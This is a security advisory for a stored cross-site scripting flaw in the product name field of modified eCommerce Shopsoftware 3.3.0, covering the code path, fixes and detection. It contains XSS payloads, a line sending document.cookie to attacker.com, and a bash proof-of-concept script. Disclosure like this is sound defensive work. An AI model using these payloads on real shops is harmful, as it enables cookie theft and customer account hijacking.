# Security Advisory: Stored Cross-Site Scripting via Product Name (Public Storefront)

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 5.4 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Stored
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Stored Cross-Site Scripting vulnerability in the public storefront's product detail, product reviews, and reviews listing pages. The `products_name` field in `products_description` is saved via `xtc_db_prepare_input()` (which only calls `trim()` and `stripslashes()`), assigned to Smarty without HTML encoding, and rendered in public templates as `{$PRODUCTS_NAME}` without the `|escape` or `|onlytext` modifier. An admin who sets a product name containing a script payload exposes every visitor who views that product's detail page, reviews page, or any listing that shows product names to XSS execution.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: product_reviews.php | rev 16825 | None | Affected |
| Component: product_reviews_info.php | rev 16825 | None | Affected |
| Component: templates/tpl_modified_nova/module/product_reviews.html | rev 16825 | None | Affected |
| Component: templates/tpl_modified_nova/module/product_info/ (all variants) | rev 16825 | None | Affected |
| Component: admin/includes/classes/categories.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker), Smarty 3

---

## 3. Vulnerability Description

Product names are stored via:

```php
// admin/includes/classes/categories.php:829
'products_name' => xtc_db_prepare_input($products_data['products_name'][$language_id]),
// xtc_db_prepare_input = trim() + stripslashes() — no HTML encoding
```

They are assigned to Smarty without encoding:

```php
// product_reviews.php:95
'PRODUCTS_NAME' => $reviews['products_name'],
// no htmlspecialchars() — raw value passed to Smarty

// product_reviews_info.php:90
$smarty->assign('PRODUCTS_NAME', $product_reviews['products_name']);
// no htmlspecialchars()
```

Smarty's `escape_html` defaults to `false`. The templates output the variable without an escape modifier:

```smarty
{* templates/tpl_modified_nova/module/product_reviews.html:6 *}
<h1>{#heading_reviews#} {$PRODUCTS_NAME}</h1>

{* templates/tpl_modified_nova/module/product_info/product_info_v1_tabs.html:27 *}
<h1 itemprop="name">{$PRODUCTS_NAME}</h1>

{* templates/tpl_modified_nova/module/product_info/product_info_v2_accordion.html:27 *}
<h1 itemprop="name">{$PRODUCTS_NAME}</h1>

{* templates/tpl_modified_nova/module/product_info/product_info_v3_plain.html:27 *}
<h1 itemprop="name">{$PRODUCTS_NAME}</h1>
```

**Note:** Some templates use `{$PRODUCTS_NAME|onlytext}` (which calls `strip_tags()`) in HTML attributes like `alt` and `title` — those are protected. The unprotected instances are in the HTML body of `<h1>` elements and visible headings, where the script executes.

### Necessary Conditions

- **Authentication:** Admin (to set up payload) + None (to trigger)
- **User interaction:** Required — victim must load the product page or reviews page
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session cookies (non-HttpOnly), page content
- **Integrity:** Low — phishing, redirect to malicious site, form capture
- **Availability:** None

The product detail page is one of the most-visited pages in a shop. Any visitor who opens a product page with a malicious name executes the payload. This includes unauthenticated shoppers, search engine users, and customers following product links from email campaigns.

---

## 5. Classification

### CVSS

- **Score:** 5.4
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | Low |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE / CAPEC

- CWE-79 / CAPEC-198: Stored XSS

---

## 6. Exploitation Scenario

1. Admin creates or edits a product, setting its name to: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`
2. Any visitor who opens `product_info.php?products_id=<id>` or `product_reviews.php?products_id=<id>` has the script execute.
3. Attacker collects customer session cookies and can hijack logged-in customer accounts.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/includes/classes/categories.php:829 (save)
         product_reviews.php:95 (assign)
         product_reviews_info.php:90 (assign)
         templates/tpl_modified_nova/module/product_reviews.html:6
         templates/tpl_modified_nova/module/product_info/product_info_v1_tabs.html:27
         templates/tpl_modified_nova/module/product_info/product_info_v2_accordion.html:27
         templates/tpl_modified_nova/module/product_info/product_info_v3_plain.html:27
Database table: products_description (column: products_name)
Parameter(s): products_name[<lang_id>] (POST — admin input)
Method: GET (unauthenticated trigger)
Authentication: Admin to inject; None to trigger
```

### Code Path

```php
// 1. Store (categories.php:829):
'products_name' => xtc_db_prepare_input($products_data['products_name'][$language_id]),
// trim() + stripslashes() only — no htmlspecialchars()

// 2. Assign (product_reviews.php:95):
'PRODUCTS_NAME' => $reviews['products_name'],  // no encoding

// 3. Template (product_reviews.html:6):
// {$PRODUCTS_NAME}  ← no |escape, Smarty escape_html=false
```

### Example Request (inject payload — admin)

```http
POST /admin/categories.php?action=update_product HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: application/x-www-form-urlencoded

securityToken=<CSRF>&products_id=<id>&products_name[1]=<script>alert(document.cookie)</script>&products_model=TEST&products_price=9.99&...
```

### Example Request (trigger — unauthenticated)

```http
GET /product_reviews.php?products_id=<id> HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

### Observed Response

```html
HTTP/1.1 200 OK

<h1>Customer Reviews <script>alert(document.cookie)</script></h1>
```

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V21 PoC — Stored XSS via products_name (public product pages)
TARGET="${TARGET:-http://localhost:9080}"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Admin login
SID=$(curl -s -c /tmp/c_v21.txt -b /tmp/c_v21.txt -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/login.php?action=process" \
  -d "username=admin%40shop.local&password=admin123&redirect=" \
  -D - -o /dev/null 2>/dev/null | grep -i "set-cookie.*MODsid" | \
  grep -oP '(?<=MODsid=)[^;]+' | head -1)

echo "[*] Session: $SID"

# Step 2: Get CSRF token from product listing
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/categories.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+' | head -1)

echo "[*] CSRF: $CSRF"

# Step 3: Get existing product ID
PROD_ID=$(docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT MIN(products_id) FROM products;" 2>/dev/null | tail -1)

echo "[*] Target product ID: $PROD_ID"

# Step 4: Save original name for cleanup
ORIG_NAME=$(docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT products_name FROM products_description WHERE products_id='$PROD_ID' AND language_id=1;" 2>/dev/null | tail -1)

echo "[*] Original name: $ORIG_NAME"

# Step 5: Update product name with XSS payload (direct DB for determinism)
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE products_description SET products_name='<script>alert(document.cookie)</script>' WHERE products_id='$PROD_ID' AND language_id=1;" 2>/dev/null

# Step 6: Trigger as unauthenticated visitor
RESP=$(curl -s "$TARGET/product_reviews.php?products_id=$PROD_ID" -H "User-Agent: $UA")
if echo "$RESP" | grep -q "alert(document.cookie)"; then
  echo "[+] VULNERABLE: XSS payload in public product reviews page"
else
  echo "[-] Not found in reviews — checking product_info"
  RESP2=$(curl -s "$TARGET/product_info.php?products_id=$PROD_ID" -H "User-Agent: $UA")
  echo "$RESP2" | grep -q "alert(document.cookie)" && \
    echo "[+] VULNERABLE: XSS in product_info.php" || echo "[-] Not found"
fi

# Cleanup
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE products_description SET products_name='$ORIG_NAME' WHERE products_id='$PROD_ID' AND language_id=1;" 2>/dev/null
```

### Expected Result

```text
[+] VULNERABLE: XSS payload in public product reviews page
```

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Catalog → Products → edit any product.
3. Enter `<script>alert(1)</script>` in the Product Name field. Save.
4. As unauthenticated user, visit `GET /product_reviews.php?products_id=<id>`.
5. Browser executes `alert(1)` — confirm Stored XSS on public product reviews page.
6. Also test `GET /product_info.php?products_id=<id>` for the same result.

---

## 10. Mitigation

- Apply `htmlspecialchars()` encoding to `products_name` before passing to Smarty, or add the `|escape` modifier in all affected templates.
- Alternatively, enable Smarty's global HTML escaping: `$smarty->setEscapeHtml(true)`, then use `{$PRODUCTS_NAME nofilter}` only where controlled HTML is intentional.
- Apply a Content Security Policy: `Content-Security-Policy: default-src 'self'`.

---

## 11. Fix

```php
// product_reviews.php:95 — Vulnerable:
'PRODUCTS_NAME' => $reviews['products_name'],
// Fixed:
'PRODUCTS_NAME' => htmlspecialchars($reviews['products_name'], ENT_QUOTES, 'UTF-8'),

// product_reviews_info.php:90 — Vulnerable:
$smarty->assign('PRODUCTS_NAME', $product_reviews['products_name']);
// Fixed:
$smarty->assign('PRODUCTS_NAME', htmlspecialchars($product_reviews['products_name'], ENT_QUOTES, 'UTF-8'));
```

```smarty
{* Alternatively, fix in templates — Vulnerable: *}
<h1>{#heading_reviews#} {$PRODUCTS_NAME}</h1>
{* Fixed: *}
<h1>{#heading_reviews#} {$PRODUCTS_NAME|escape:'html'}</h1>
```

---

## 12. Detection and Indicators

```sql
SELECT products_id, products_name
FROM products_description
WHERE products_name LIKE '%<%';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed: products_name saved via xtc_db_prepare_input(), assigned raw to Smarty, rendered without \|escape in public templates |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 15. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 16. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 17. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip/Advisory
